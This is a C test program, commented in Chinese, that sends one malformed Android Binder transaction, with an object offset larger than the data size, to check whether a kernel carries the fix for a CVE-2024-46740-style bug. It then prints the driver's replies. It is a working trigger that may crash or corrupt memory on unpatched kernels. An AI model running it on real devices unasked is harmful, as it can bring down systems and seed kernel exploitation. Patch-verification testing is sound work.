/**
 * binder_offset_oversize.c — CVE-2024-46740 风格最小触发（非利用）
 *
 * 假设: BINDER_WRITE_READ + BC_TRANSACTION，offsets 里放 object_offset > data_size。
 * 修补后应在 copy 前拒绝（BR_FAILED_REPLY / 存活）。
 * 未修可能 OOB / 崩。只跑一次，不循环。
 *
 * 不依赖 #245 vmlinux。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define BINDER_IOC(dir, nr, sz) \
  (((dir) << 30) | ((sz) << 16) | (('b') << 8) | (nr))
#define BINDER_WRITE_READ BINDER_IOC(3, 1, 48)
#define BINDER_VERSION BINDER_IOC(3, 9, 4)
#define BINDER_SET_MAX_THREADS BINDER_IOC(1, 5, 4)
#define BINDER_THREAD_EXIT BINDER_IOC(0, 8, 0)

#define BC_TRANSACTION 0x40406300u /* _IOW('c', 0, struct binder_transaction_data) */

#define BINDER_TYPE_PTR 0x70742a85u

struct binder_write_read {
  uint64_t write_size;
  uint64_t write_consumed;
  uint64_t write_buffer;
  uint64_t read_size;
  uint64_t read_consumed;
  uint64_t read_buffer;
};

struct binder_transaction_data {
  uint32_t target_handle;
  uint32_t pad0;
  uint64_t cookie;
  uint32_t code;
  uint32_t flags;
  int32_t sender_pid;
  uint32_t sender_euid;
  uint64_t data_size;
  uint64_t offsets_size;
  uint64_t data_buffer;
  uint64_t data_offsets;
};

static const char *br_name(uint32_t cmd) {
  switch (cmd) {
  case 0x00007201:
    return "BR_ERROR";
  case 0x00007202:
    return "BR_OK";
  case 0x00007203:
    return "BR_TRANSACTION";
  case 0x00007204:
    return "BR_REPLY";
  case 0x00007205:
    return "BR_ACQUIRE_RESULT";
  case 0x00007206:
    return "BR_DEAD_REPLY";
  case 0x00007207:
    return "BR_TRANSACTION_COMPLETE";
  case 0x00007208:
    return "BR_INCREFS";
  case 0x00007209:
    return "BR_ACQUIRE";
  case 0x0000720a:
    return "BR_RELEASE";
  case 0x0000720b:
    return "BR_DECREFS";
  case 0x0000720c:
    return "BR_ATTEMPT_ACQUIRE";
  case 0x0000720d:
    return "BR_NOOP";
  case 0x0000720e:
    return "BR_SPAWN_LOOPER";
  case 0x0000720f:
    return "BR_FINISHED";
  case 0x00007210:
    return "BR_DEAD_BINDER";
  case 0x00007211:
    return "BR_CLEAR_DEATH_NOTIFICATION_DONE";
  case 0x00007212:
    return "BR_FAILED_REPLY";
  default:
    return "?";
  }
}

int main(void) {
  printf("binder_offset_oversize — object_offset > data_size\n");

  int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    printf("open /dev/binder errno=%d (%s)\n", errno, strerror(errno));
    return 1;
  }

  int32_t proto = 0;
  errno = 0;
  int r = ioctl(fd, BINDER_VERSION, &proto);
  printf("BINDER_VERSION ret=%d errno=%d proto=%d\n", r, r < 0 ? errno : 0, proto);

  uint32_t max_threads = 1;
  errno = 0;
  r = ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads);
  printf("SET_MAX_THREADS ret=%d errno=%d\n", r, r < 0 ? errno : 0);

  void *map = mmap(NULL, 0x20000, PROT_READ, MAP_PRIVATE, fd, 0);
  printf("mmap binder %s errno=%d\n", map == MAP_FAILED ? "FAIL" : "OK",
         map == MAP_FAILED ? errno : 0);

  /* data_size=0x10, one offset = 0x100 (> data_size). */
  uint8_t data[0x20];
  uint64_t offsets[1];
  memset(data, 0, sizeof(data));
  *(uint32_t *)data = BINDER_TYPE_PTR;
  offsets[0] = 0x100;

  uint8_t writebuf[8 + sizeof(struct binder_transaction_data)];
  memset(writebuf, 0, sizeof(writebuf));
  *(uint32_t *)writebuf = BC_TRANSACTION;
  struct binder_transaction_data *tr =
      (struct binder_transaction_data *)(writebuf + 8);
  tr->target_handle = 0; /* context manager */
  tr->code = 1;
  tr->flags = 0x01; /* TF_ONE_WAY */
  tr->data_size = 0x10;
  tr->offsets_size = sizeof(offsets);
  tr->data_buffer = (uint64_t)(uintptr_t)data;
  tr->data_offsets = (uint64_t)(uintptr_t)offsets;

  uint8_t readbuf[256];
  memset(readbuf, 0, sizeof(readbuf));

  struct binder_write_read bwr;
  memset(&bwr, 0, sizeof(bwr));
  bwr.write_size = sizeof(writebuf);
  bwr.write_buffer = (uint64_t)(uintptr_t)writebuf;
  bwr.read_size = sizeof(readbuf);
  bwr.read_buffer = (uint64_t)(uintptr_t)readbuf;

  errno = 0;
  r = ioctl(fd, BINDER_WRITE_READ, &bwr);
  int e = errno;
  printf("WRITE_READ oversize-offset ret=%d errno=%d (%s) wcons=%llu rcons=%llu\n",
         r, r < 0 ? e : 0, r < 0 ? strerror(e) : "OK",
         (unsigned long long)bwr.write_consumed,
         (unsigned long long)bwr.read_consumed);

  size_t consumed = (size_t)bwr.read_consumed;
  if (consumed > sizeof(readbuf))
    consumed = sizeof(readbuf);
  size_t off = 0;
  while (off + 4 <= consumed) {
    uint32_t cmd = 0;
    memcpy(&cmd, readbuf + off, 4);
    printf("  BR cmd=0x%08x %s\n", cmd, br_name(cmd));
    if (cmd == 0x00007201 && off + 8 <= consumed) {
      int32_t err = 0;
      memcpy(&err, readbuf + off + 4, 4);
      printf("    BR_ERROR=%d\n", err);
      off += 8;
      continue;
    }
    off += 4;
    /* Conservative skip: most BR_* here are 4-byte only. */
    if (cmd == 0x80407203 || cmd == 0x80407204)
      off += 0x40; /* transaction/reply payload, 64-bit */
  }

  ioctl(fd, BINDER_THREAD_EXIT, NULL);
  if (map != MAP_FAILED)
    munmap(map, 0x20000);
  close(fd);
  printf("KERNEL SURVIVED\n");
  return 0;
}
